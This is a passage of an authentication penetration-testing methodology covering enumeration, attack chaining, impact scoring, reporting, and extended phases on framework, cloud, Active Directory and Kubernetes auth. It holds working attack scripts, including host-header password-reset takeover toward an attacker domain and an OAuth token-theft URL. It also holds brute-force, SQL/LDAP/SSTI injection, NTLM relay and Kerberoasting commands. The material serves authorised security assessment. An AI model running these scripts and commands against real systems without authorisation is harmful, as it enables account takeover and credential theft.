| Email verification bypass | [ ] | |
| Rate limiting on registration | [ ] | |
| CAPTCHA effectiveness | [ ] | |

---

## Phase 9: Account Enumeration

### Objective
Identify information disclosure that reveals valid accounts.

### Step-by-Step Procedure

#### 9.1 Login Response Analysis

```http
# Test different scenarios
# Valid username, wrong password
POST /api/login HTTP/1.1
{"username": "admin", "password": "wrongpass"}
# Response: "Invalid password"  <- ENUMERATION

# Invalid username
POST /api/login HTTP/1.1
{"username": "nonexistent", "password": "wrongpass"}
# Response: "User not found"  <- ENUMERATION

# Secure response (same for both):
# Response: "Invalid credentials"
```

#### 9.2 Enumeration Vectors

```http
# Registration endpoint
POST /api/register HTTP/1.1
{"email": "existing@example.com", "password": "pass"}
# Response: "Email already registered"  <- ENUMERATION

# Password reset
POST /api/forgot-password HTTP/1.1
{"email": "existing@example.com"}
# Response: "Reset link sent"

{"email": "nonexistent@example.com"}
# Response: "Email not found"  <- ENUMERATION

# Response timing
# Valid user: 500ms (database lookup + password hash comparison)
# Invalid user: 50ms (quick fail)  <- TIMING ENUMERATION
```

#### 9.3 Enumeration Testing Script

```python
#!/usr/bin/env python3
"""Account Enumeration Tester"""

import requests
import time
import statistics

class EnumerationTester:
    def __init__(self, base_url):
        self.base_url = base_url

    def test_login_enumeration(self, valid_users, invalid_users):
        """Test login endpoint for enumeration"""
        results = {'response_based': [], 'timing_based': []}

        valid_responses = set()
        invalid_responses = set()
        valid_times = []
        invalid_times = []

        for user in valid_users:
            start = time.perf_counter()
            resp = requests.post(
                f"{self.base_url}/api/login",
                json={"username": user, "password": "wrongpass"}
            )
            elapsed = time.perf_counter() - start

            valid_responses.add(resp.text)
            valid_times.append(elapsed)

        for user in invalid_users:
            start = time.perf_counter()
            resp = requests.post(
                f"{self.base_url}/api/login",
                json={"username": user, "password": "wrongpass"}
            )
            elapsed = time.perf_counter() - start

            invalid_responses.add(resp.text)
            invalid_times.append(elapsed)

        # Check response-based enumeration
        if valid_responses != invalid_responses:
            results['response_based'] = {
                'vulnerable': True,
                'valid_response': list(valid_responses),
                'invalid_response': list(invalid_responses)
            }

        # Check timing-based enumeration
        valid_avg = statistics.mean(valid_times)
        invalid_avg = statistics.mean(invalid_times)
        time_diff = abs(valid_avg - invalid_avg)

        if time_diff > 0.1:  # 100ms difference
            results['timing_based'] = {
                'vulnerable': True,
                'valid_avg': valid_avg,
                'invalid_avg': invalid_avg,
                'difference': time_diff
            }

        return results

    def test_registration_enumeration(self, emails):
        """Test registration for email enumeration"""
        results = {}
        for email in emails:
            resp = requests.post(
                f"{self.base_url}/api/register",
                json={"email": email, "password": "TestPass123!"}
            )
            results[email] = {
                'status': resp.status_code,
                'response': resp.text[:200]
            }
        return results

    def test_reset_enumeration(self, emails):
        """Test password reset for enumeration"""
        results = {}
        for email in emails:
            resp = requests.post(
                f"{self.base_url}/api/forgot-password",
                json={"email": email}
            )
            results[email] = {
                'status': resp.status_code,
                'response': resp.text[:200]
            }
        return results
```

### Checklist

| Item | Status | Notes |
|------|--------|-------|
| Login response analysis | [ ] | |
| Registration enumeration | [ ] | |
| Password reset enumeration | [ ] | |
| Timing-based enumeration | [ ] | |
| Error message analysis | [ ] | |
| HTTP status code analysis | [ ] | |

---

## Phase 10: Exploitation and Chaining

### Objective
Chain discovered vulnerabilities for maximum impact.

### Step-by-Step Procedure

#### 10.1 Common Attack Chains

```
Chain 1: Account Takeover via Password Reset
[Enumeration] -> [Host Header Injection] -> [Account Takeover]
1. Enumerate valid email via registration
2. Trigger password reset with Host: attacker.com
3. Capture reset token from attacker's server
4. Reset victim's password

Chain 2: Privilege Escalation via Registration
[Mass Assignment] -> [Admin Access]
1. Register with role=admin parameter
2. Access admin panel
3. Exfiltrate sensitive data

Chain 3: MFA Bypass to Full Access
[Partial Auth] -> [Direct Access] -> [Session Hijack]
1. Complete password authentication
2. Skip MFA via direct endpoint access
3. Access authenticated resources
4. Perform privileged actions

Chain 4: Account Takeover via OAuth
[OAuth Redirect] -> [Token Theft] -> [Account Takeover]
1. Craft malicious OAuth redirect
2. Victim clicks link
3. Authorization code sent to attacker
4. Exchange for access token
5. Full account access
```

#### 10.2 Exploitation Scripts

```python
#!/usr/bin/env python3
"""Attack Chain Executor"""

import requests

class AttackChains:
    def __init__(self, base_url):
        self.base_url = base_url

    def chain_password_reset_takeover(self, victim_email, attacker_domain):
        """Password reset host header injection chain"""

        # Step 1: Trigger reset with injected host
        resp = requests.post(
            f"{self.base_url}/api/forgot-password",
            json={"email": victim_email},
            headers={"Host": attacker_domain}
        )

        if resp.status_code == 200:
            return {
                'status': 'INITIATED',
                'next_step': f'Monitor {attacker_domain} for incoming token'
            }
        return {'status': 'FAILED'}

    def chain_mfa_bypass_escalation(self, username, password):
        """MFA bypass to privilege escalation"""
        session = requests.Session()

        # Step 1: Password authentication
        resp = session.post(
            f"{self.base_url}/api/login",
            json={"username": username, "password": password}
        )

        # Step 2: Skip MFA, access authenticated endpoint
        resp = session.get(f"{self.base_url}/api/user/profile")

        if resp.status_code == 200:
            # Step 3: Attempt privilege escalation
            resp = session.post(
                f"{self.base_url}/api/user/update",
                json={"role": "admin"}
            )
            return {
                'mfa_bypassed': True,
                'escalation_attempt': resp.status_code
            }
        return {'mfa_bypassed': False}

    def chain_oauth_account_takeover(self, client_id, redirect_uri):
        """OAuth redirect manipulation chain"""

        # Craft malicious authorization URL
        attack_url = (
            f"{self.base_url}/oauth/authorize?"
            f"client_id={client_id}&"
            f"redirect_uri={redirect_uri}&"
            f"response_type=code&"
            f"scope=openid profile email"
        )

        return {
            'attack_url': attack_url,
            'instructions': [
                '1. Send attack_url to victim',
                '2. Capture authorization code at redirect_uri',
                '3. Exchange code for access token',
                '4. Access victim account'
            ]
        }
```

### Attack Chain Matrix

| Initial Vuln | Chain With | Final Impact |
|--------------|------------|--------------|
| Enumeration | Password Reset | Account Takeover |
| Mass Assignment | Registration | Privilege Escalation |
| MFA Bypass | Session Hijack | Full Account Access |
| IDOR | Data Exfiltration | Data Breach |
| OAuth Redirect | Token Theft | Account Takeover |
| SAML Injection | Assertion Manipulation | Identity Spoofing |

---

## Phase 11: Impact Assessment

### Objective
Evaluate the business impact and severity of discovered vulnerabilities.

### Step-by-Step Procedure

#### 11.1 Impact Classification

```
CRITICAL (CVSS 9.0-10.0):
- Authentication bypass affecting all users
- Remote code execution via auth mechanisms
- Complete database access via SQL injection in login
- Admin account takeover

HIGH (CVSS 7.0-8.9):
- Single account takeover
- MFA bypass
- Privilege escalation to admin
- Mass account enumeration
- Session hijacking

MEDIUM (CVSS 4.0-6.9):
- Limited account enumeration
- Information disclosure
- Weak password policy bypass
- Token prediction (partial)

LOW (CVSS 0.1-3.9):
- Verbose error messages
- Missing security headers
- Minor information leakage
```

#### 11.2 Impact Assessment Framework

```python
#!/usr/bin/env python3
"""Vulnerability Impact Assessor"""

class ImpactAssessor:
    def __init__(self):
        self.severity_matrix = {
            'auth_bypass': {'base': 9.8, 'scope': 'changed'},
            'account_takeover': {'base': 8.8, 'scope': 'unchanged'},
            'mfa_bypass': {'base': 8.1, 'scope': 'unchanged'},
            'privilege_escalation': {'base': 8.8, 'scope': 'unchanged'},
            'session_hijacking': {'base': 7.5, 'scope': 'unchanged'},
            'enumeration': {'base': 5.3, 'scope': 'unchanged'},
            'information_disclosure': {'base': 4.3, 'scope': 'unchanged'}
        }

    def assess_vulnerability(self, vuln_type, affected_users, data_exposure):
        """Calculate impact score"""
        base_score = self.severity_matrix.get(vuln_type, {}).get('base', 5.0)

        # Adjust for affected users
        if affected_users == 'all':
            user_modifier = 1.2
        elif affected_users == 'authenticated':
            user_modifier = 1.0
        else:
            user_modifier = 0.8

        # Adjust for data exposure
        data_modifiers = {
            'credentials': 1.3,
            'pii': 1.2,
            'financial': 1.4,
            'none': 0.8
        }
        data_modifier = data_modifiers.get(data_exposure, 1.0)

        final_score = min(base_score * user_modifier * data_modifier, 10.0)

        return {
            'base_score': base_score,
            'final_score': round(final_score, 1),
            'severity': self.get_severity_label(final_score)
        }

    def get_severity_label(self, score):
        """Get severity label from score"""
        if score >= 9.0:
            return 'CRITICAL'
        elif score >= 7.0:
            return 'HIGH'
        elif score >= 4.0:
            return 'MEDIUM'
        else:
            return 'LOW'

    def calculate_business_impact(self, vulnerabilities):
        """Calculate overall business impact"""
        impacts = {
            'reputation': 0,
            'financial': 0,
            'compliance': 0,
            'operational': 0
        }

        for vuln in vulnerabilities:
            if vuln['type'] in ['auth_bypass', 'account_takeover']:
                impacts['reputation'] += 3
                impacts['financial'] += 3
                impacts['compliance'] += 2
            elif vuln['type'] in ['mfa_bypass', 'privilege_escalation']:
                impacts['reputation'] += 2
                impacts['financial'] += 2
                impacts['compliance'] += 2
            elif vuln['type'] == 'enumeration':
                impacts['reputation'] += 1
                impacts['compliance'] += 1

        return impacts
```

### Impact Checklist

| Factor | Assessment | Notes |
|--------|------------|-------|
| Users affected | [ ] All / [ ] Subset | |
| Data exposure type | [ ] Credentials / [ ] PII / [ ] Financial | |
| Exploitation difficulty | [ ] Easy / [ ] Medium / [ ] Hard | |
| Authentication required | [ ] Yes / [ ] No | |
| Privilege required | [ ] None / [ ] Low / [ ] High | |
| User interaction | [ ] Required / [ ] Not Required | |

---

## Phase 12: Reporting

### Objective
Document findings with clear reproduction steps and remediation guidance.

### Report Structure

```markdown
# Authentication Security Assessment Report

## Executive Summary
- Assessment scope and objectives
- Key findings summary
- Risk rating overview
- Recommended priority actions

## Methodology
- Testing approach
- Tools used
- Limitations and scope boundaries

## Findings

### Finding 1: [Vulnerability Title]

**Severity:** CRITICAL / HIGH / MEDIUM / LOW

**CVSS Score:** X.X

**Affected Component:** /api/login

**Description:**
Detailed description of the vulnerability and its root cause.

**Impact:**
Business and technical impact if exploited.

**Proof of Concept:**
```http
POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json

{"username": "admin'--", "password": "x"}
```

**Steps to Reproduce:**
1. Navigate to login page
2. Enter payload in username field
3. Observe authentication bypass

**Evidence:**
[Screenshots, response data, logs]

**Remediation:**
- Immediate: [Quick fix]
- Long-term: [Proper solution]
- Reference: [OWASP/NIST guidance]

## Recommendations Summary

| Priority | Finding | Remediation | Effort |
|----------|---------|-------------|--------|
| P1 | SQL Injection | Parameterized queries | Medium |
| P1 | MFA Bypass | Server-side validation | High |
| P2 | Weak Passwords | Policy enforcement | Low |

## Appendices
- A: Full HTTP Requests/Responses
- B: Tool Output
- C: References
```

### Reporting Script

```python
#!/usr/bin/env python3
"""Security Report Generator"""

import json
from datetime import datetime

class ReportGenerator:
    def __init__(self, target, assessor):
        self.target = target
        self.assessor = assessor
        self.findings = []

    def add_finding(self, finding):
        """Add a finding to the report"""
        self.findings.append({
            **finding,
            'timestamp': datetime.now().isoformat()
        })

    def generate_markdown(self):
        """Generate markdown report"""
        report = f"""# Authentication Security Assessment Report

## Target: {self.target}
## Assessment Date: {datetime.now().strftime('%Y-%m-%d')}
## Assessor: {self.assessor}

---

## Executive Summary

This assessment identified **{len(self.findings)}** vulnerabilities:
- Critical: {sum(1 for f in self.findings if f.get('severity') == 'CRITICAL')}
- High: {sum(1 for f in self.findings if f.get('severity') == 'HIGH')}
- Medium: {sum(1 for f in self.findings if f.get('severity') == 'MEDIUM')}
- Low: {sum(1 for f in self.findings if f.get('severity') == 'LOW')}

---

## Detailed Findings

"""

        for i, finding in enumerate(self.findings, 1):
            report += f"""### {i}. {finding.get('title', 'Untitled Finding')}

**Severity:** {finding.get('severity', 'UNKNOWN')}

**Affected Component:** {finding.get('component', 'N/A')}

**Description:**
{finding.get('description', 'No description provided.')}

**Impact:**
{finding.get('impact', 'Impact not assessed.')}

**Proof of Concept:**
```
{finding.get('poc', 'No PoC provided.')}
```

**Remediation:**
{finding.get('remediation', 'Remediation not provided.')}

---

"""

        return report

    def generate_json(self):
        """Generate JSON report"""
        return json.dumps({
            'target': self.target,
            'assessor': self.assessor,
            'date': datetime.now().isoformat(),
            'findings': self.findings
        }, indent=2)

    def export(self, format='markdown', filename=None):
        """Export report to file"""
        if format == 'markdown':
            content = self.generate_markdown()
            ext = 'md'
        else:
            content = self.generate_json()
            ext = 'json'

        if filename is None:
            filename = f"auth_assessment_{self.target}_{datetime.now().strftime('%Y%m%d')}.{ext}"

        with open(filename, 'w') as f:
            f.write(content)

        return filename
```

### Reporting Checklist

| Item | Status | Notes |
|------|--------|-------|
| Executive summary complete | [ ] | |
| All findings documented | [ ] | |
| PoC for each finding | [ ] | |
| Reproduction steps clear | [ ] | |
| Impact assessment included | [ ] | |
| Remediation provided | [ ] | |
| Screenshots/evidence attached | [ ] | |
| CVSS scores calculated | [ ] | |
| Recommendations prioritized | [ ] | |

---

## Quick Reference: Tool Commands

### Reconnaissance

```bash
# Technology fingerprinting
whatweb https://target.com
wappalyzer https://target.com

# Directory enumeration
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### Authentication Testing

```bash
# Brute force with Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# JWT testing with jwt_tool
jwt_tool <TOKEN> -X a  # Test all algorithms
jwt_tool <TOKEN> -I -pc name -pv admin  # Inject claim

# SQL injection with sqlmap
sqlmap -u "http://target.com/login" --data="username=admin&password=test" --level=5 --risk=3
```

### Session Testing

```bash
# Cookie analysis
curl -I https://target.com/login | grep -i "set-cookie"

# Session token collection
for i in {1..100}; do curl -s https://target.com/login -c - | grep session; done
```

### MFA Testing

```bash
# OTP brute force with ffuf
ffuf -u https://target.com/api/verify-otp -X POST -H "Content-Type: application/json" -H "Cookie: session=TOKEN" -d '{"otp":"FUZZ"}' -w otp_wordlist.txt -fc 401
```

---

## References

### Standards and Guidelines
- OWASP Testing Guide v4.2 - Authentication Testing
- OWASP ASVS v4.0 - Authentication Requirements
- NIST SP 800-63B - Digital Identity Guidelines
- CWE-287 - Improper Authentication

### Tools
- Burp Suite Professional
- OWASP ZAP
- ffuf / gobuster
- Hydra
- sqlmap
- jwt_tool
- Nuclei

### Research
- PortSwigger Web Security Academy
- HackerOne Hacktivity
- Bug Bounty Reports (Authentication)

---

# ═══════════════════════════════════════════════════════════════
# ADVANCED TESTING PHASES EXTENSION v3.0 (2026-10)
# Phases 13-20 covering extended attack categories
# Original content above (Phases 1-12) is UNCHANGED.
# ═══════════════════════════════════════════════════════════════

## Phase 13: Framework Middleware Bypass Testing

### Objective
Test web framework middleware and route guards for authentication bypass vulnerabilities.

### Checklist
- [ ] Detect target web framework (Next.js, Nuxt.js, SvelteKit, Remix, Spring, Django, Express)
- [ ] Test Next.js middleware bypass (CVE-2025-29927) with x-middleware-subrequest headers
- [ ] Test Next.js ISR/SSG data route access (/_next/data/{BUILD_ID}/)
- [ ] Test Nuxt.js payload leak (/_payload.json on protected routes)
- [ ] Test SvelteKit data endpoint leak (/__data.json on protected routes)
- [ ] Test Remix loader data bypass (?_data=routes/admin)
- [ ] Test Spring Security path traversal (/admin;, /admin%3b, /admin..;/, /actuator/)
- [ ] Test Django APPEND_SLASH gap (/admin vs /admin/)
- [ ] Test Express prototype pollution in auth objects
- [ ] Test HTTP method override headers (X-HTTP-Method-Override, X-Method-Override)
- [ ] Test path normalization differences (double encoding, case variation)

### Commands
```bash
# Automated framework bypass testing
python tools/framework-bypass-tester.py https://target.com

# Manual Next.js CVE-2025-29927
curl -H "x-middleware-subrequest: middleware" https://target.com/admin
curl -H "x-middleware-subrequest: src/middleware" https://target.com/admin

# Spring Security semicolon bypass
curl https://target.com/admin;bypass=true
curl https://target.com/api/..;/admin

# Nuxt.js payload leak
curl https://target.com/admin/_payload.json

# SvelteKit data leak
curl https://target.com/admin/__data.json
```

### Reference Files
- `knowledge-base/33-framework-middleware-bypass.md`
- `payloads/framework-bypass-payloads.txt`
- `tools/framework-bypass-tester.py`

---

## Phase 14: AitM Phishing & Advanced MFA Bypass Testing

### Objective
Assess resilience against adversary-in-the-middle phishing and advanced MFA bypass techniques.

### Checklist
- [ ] Evaluate MFA implementation for push fatigue vulnerability
- [ ] Check if number matching is enforced for push-based MFA
- [ ] Test for MFA race condition (submit valid code multiple times simultaneously)
- [ ] Assess OAuth device code flow for phishing susceptibility
- [ ] Check if session tokens are bound to device/IP after MFA completion
- [ ] Test MFA response manipulation (modify status code, change response body)
- [ ] Verify MFA state is validated server-side (not just client-side routing)
- [ ] Check for MFA bypass via direct API access (skip UI flow)
- [ ] Assess if backup codes are properly rate-limited and single-use

### Commands
```bash
# Test MFA race condition
python tools/race-condition-tester.py https://target.com

# Check MFA enforcement on API
curl -X POST https://target.com/api/v1/admin -H "Authorization: Bearer TOKEN_WITHOUT_MFA"

# Test MFA bypass via response manipulation (Burp Suite)
# Intercept MFA verify response → change 401 to 200
```

### Reference Files
- `knowledge-base/34-aitm-phishing-attacks.md`

---

## Phase 15: GraphQL/gRPC/WebSocket Auth Testing

### Objective
Test modern API protocols for authentication and authorization weaknesses.

### Checklist
- [ ] Discover GraphQL endpoints (/graphql, /api/graphql, /query)
- [ ] Test introspection for schema exposure
- [ ] Test query batching for rate limit bypass
- [ ] Test alias multiplication for operation bypass
- [ ] Test unprotected admin mutations
- [ ] Test nested query authorization (field-level access)
- [ ] Test GraphQL query depth limits (DoS prevention)
- [ ] Discover gRPC services via reflection
- [ ] Test gRPC metadata injection (auth headers)
- [ ] Test gRPC plaintext channel fallback
- [ ] Test WebSocket upgrade without authentication
- [ ] Test CSWSH (Cross-Site WebSocket Hijacking) with wrong Origin
- [ ] Test post-auth WebSocket message injection

### Commands
```bash
# Automated GraphQL auth testing
python tools/graphql-auth-tester.py https://target.com/graphql

# Manual introspection
curl -X POST https://target.com/graphql -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}'

# gRPC reflection
grpcurl -plaintext target:50051 list
grpcurl -plaintext target:50051 describe

# WebSocket CSWSH test
wscat -c "wss://target.com/ws" --origin "https://evil.com"
```

### Reference Files
- `knowledge-base/38-graphql-grpc-websocket-auth.md`
- `payloads/graphql-grpc-ws-payloads.txt`
- `tools/graphql-auth-tester.py`

---

## Phase 16: CI/CD OIDC & Cloud Auth Testing

### Objective
Test CI/CD pipeline OIDC trust configurations and cloud IAM for privilege escalation.

### Checklist
- [ ] Identify CI/CD platform (GitHub Actions, GitLab CI, CircleCI)
- [ ] Test OIDC token extraction from CI runners
- [ ] Analyze AWS trust policies for missing sub restrictions
- [ ] Check for wildcard sub patterns in OIDC trust
- [ ] Test cross-account role assumption
- [ ] Enumerate AWS IAM permissions for escalation paths
- [ ] Test IMDSv1 accessibility (169.254.169.254)
- [ ] Check Azure managed identity token access
- [ ] Test GCP metadata server for default SA tokens
- [ ] Test GCP service account impersonation chain
- [ ] Check SCIM provisioning endpoints for unauthorized access
- [ ] Test container registry auth (/v2/_catalog exposure)

### Commands
```bash
# Cloud IAM testing
python tools/cloud-iam-tester.py aws
python tools/cloud-iam-tester.py azure
python tools/cloud-iam-tester.py gcp

# AWS trust policy check
aws iam list-roles --query "Roles[?AssumeRolePolicyDocument.Statement[?Condition==null]]"

# Container registry catalog
curl https://registry.target.com/v2/_catalog

# SCIM endpoint discovery
curl https://target.com/scim/v2/Users
curl https://target.com/scim/v2/ServiceProviderConfig
```

### Reference Files
- `knowledge-base/36-cicd-oidc-attacks.md`
- `knowledge-base/44-cloud-iam-advanced.md`
- `payloads/cicd-oidc-payloads.txt`
- `payloads/cloud-iam-payloads.txt`
- `tools/cloud-iam-tester.py`

---

## Phase 17: Race Condition & Session State Testing

### Objective
Test for race conditions in auth flows and session state confusion vulnerabilities.

### Checklist
- [ ] Test MFA verification for single-packet race condition
- [ ] Test registration endpoint for duplicate account creation race
- [ ] Test password reset token for race condition reuse
- [ ] Test coupon/promo code for parallel application race
- [ ] Test rate limiting bypass via concurrent requests
- [ ] Test session puzzling (reset flow → admin access)
- [ ] Test SPA auth state manipulation (localStorage/sessionStorage)
- [ ] Test account pre-hijacking (all 5 classes)
- [ ] Test parallel session flows for mixed auth state

### Commands
```bash
# Automated race condition testing
python tools/race-condition-tester.py https://target.com

# Turbo Intruder single-packet race (Burp Suite)
# Use race-single-packet-attack.py template
# Target: MFA verify, registration, password reset endpoints

# Session puzzling manual test
# Step 1: POST /forgot-password (creates session state)
# Step 2: GET /admin (check if session state grants access)
```

### Reference Files
- `knowledge-base/40-race-conditions-advanced.md`
- `payloads/race-condition-payloads.txt`
- `tools/race-condition-tester.py`

---

## Phase 18: Deserialization & SSTI in Auth Flows

### Objective
Test for deserialization and server-side template injection vulnerabilities in authentication flows.

### Checklist
- [ ] Identify serialized objects in auth tokens/cookies (Java, PHP, .NET, Python)
- [ ] Test Java deserialization in remember-me cookies (Base64 + Java magic bytes)
- [ ] Test .NET ViewState deserialization (encrypted/signed validation)
- [ ] Test PHP unserialize in session data
- [ ] Test Python pickle in session/auth tokens
- [ ] Test SSTI in login error messages (username reflection)
- [ ] Test SSTI in registration confirmation (name/email fields)
- [ ] Test SSTI in password reset flow (email templates)
- [ ] Test Redis session store for injection (CRLF in session data)
- [ ] Test Memcached session store for injection

### Commands
```bash
# Test SSTI in login form
curl -X POST https://target.com/login -d 'username={{7*7}}&password=test'
curl -X POST https://target.com/login -d 'username=${7*7}&password=test'

# Check for Java serialization (Base64 decode → look for AC ED 00 05)
echo "COOKIE_VALUE" | base64 -d | xxd | head

# Test Redis session injection
redis-cli -h target SET "session:injected" '{"user":"admin","role":"admin"}'
```

### Reference Files
- `knowledge-base/39-deserialization-ssti-auth.md`

---

## Phase 19: Network & Legacy Auth Protocol Testing

### Objective
Test NTLM, Kerberos, LDAP, and RADIUS authentication for modern bypass techniques.

### Checklist
- [ ] Identify NTLM authentication endpoints (WWW-Authenticate: NTLM/Negotiate)
- [ ] Test NTLM relay via coercion (PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce)
- [ ] Test pass-the-hash with captured NTLM hashes
- [ ] Test AS-REP Roasting for accounts without pre-auth
- [ ] Test Kerberoasting for service accounts with weak passwords
- [ ] Test for Golden/Silver Ticket in hybrid AD environments
- [ ] Test LDAP injection in authentication parameters
- [ ] Test Blast-RADIUS (CVE-2024-3596) if RADIUS is in use
- [ ] Test TACACS+ for shared secret weakness
- [ ] Test mTLS bypass via header injection

### Commands
```bash
# NTLM relay
python3 PetitPotam.py LISTENER_IP TARGET_IP
impacket-ntlmrelayx -t ldap://DC_IP --escalate-user attacker

# Kerberoasting
impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request

# AS-REP Roasting
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -format hashcat -dc-ip DC_IP

# LDAP injection test
curl -X POST https://target.com/login -d 'username=*)(uid=*))(|(uid=*&password=anything'

# mTLS header bypass
curl -H 'X-Forwarded-Client-Cert: Hash=AA;Subject="CN=admin"' https://target.com/admin
```

### Reference Files
- `knowledge-base/43-network-legacy-modern-auth.md`
- `payloads/cloud-iam-payloads.txt`

---

## Phase 20: Kubernetes, Service Mesh & Container Auth Testing

### Objective
Test Kubernetes RBAC, service mesh authorization, and container-level authentication.

### Checklist
- [ ] Check ServiceAccount token permissions (kubectl auth can-i --list)
- [ ] Test for CVE-2025-1974 IngressNightmare
- [ ] Test secret enumeration from compromised pod
- [ ] Test privileged pod creation for node escape
- [ ] Test Istio AuthorizationPolicy bypass (path case sensitivity, headers)
- [ ] Test Envoy filter bypass for auth rules
- [ ] Test admission controller bypass (webhook downtime window)
- [ ] Test container registry catalog enumeration
- [ ] Check for cross-namespace secret access

### Commands
```bash
# K8s permission check
kubectl auth can-i --list
kubectl get secrets --all-namespaces

# Istio policy bypass (case sensitivity)
curl https://target.com/ADMIN  # vs /admin
curl -H "x-forwarded-for: 10.0.0.1" https://target.com/admin

# Container registry catalog
curl https://registry.target.com/v2/_catalog
curl https://registry.target.com/v2/app/tags/list
```

### Reference Files
- `knowledge-base/37-kubernetes-service-mesh-auth.md`

---

## Extended Phase Summary

| Phase | Focus | KB Files | Payloads | Tools |
|-------|-------|----------|----------|-------|
| 13 | Framework Middleware Bypass | 33 | framework-bypass-payloads.txt | framework-bypass-tester.py |
| 14 | AitM & MFA Bypass | 34 | - | race-condition-tester.py |
| 15 | GraphQL/gRPC/WebSocket | 38 | graphql-grpc-ws-payloads.txt | graphql-auth-tester.py |
| 16 | CI/CD OIDC & Cloud IAM | 36, 44 | cicd-oidc-payloads.txt, cloud-iam-payloads.txt | cloud-iam-tester.py |
| 17 | Race Conditions & Session State | 40 | race-condition-payloads.txt | race-condition-tester.py |
| 18 | Deserialization & SSTI | 39 | - | - |
| 19 | Network & Legacy Auth | 43 | cloud-iam-payloads.txt | - |
| 20 | K8s & Service Mesh | 37 | - | - |

## Extended References

### CVEs
- CVE-2025-29927 - Next.js Middleware Bypass
- CVE-2025-1974 - Kubernetes IngressNightmare
- CVE-2024-3596 - Blast-RADIUS
- CVE-2024-27316 - HTTP/2 CONTINUATION Flood (Apache)
- CVE-2024-24549 - HTTP/2 CONTINUATION Flood (Tomcat)

### RFCs & Standards
- RFC 8693 - OAuth 2.0 Token Exchange
- RFC 9449 - DPoP (Demonstrating Proof of Possession)
- OAuth 2.1 Draft Specification
- GNAP - Grant Negotiation and Authorization Protocol

### Tools (Extended)
- EvilGinx3 - AitM phishing framework
- Turbo Intruder - Single-packet race condition testing
- grpcurl - gRPC reflection and testing
- Impacket - NTLM/Kerberos attack suite
- kubectl - Kubernetes permission testing
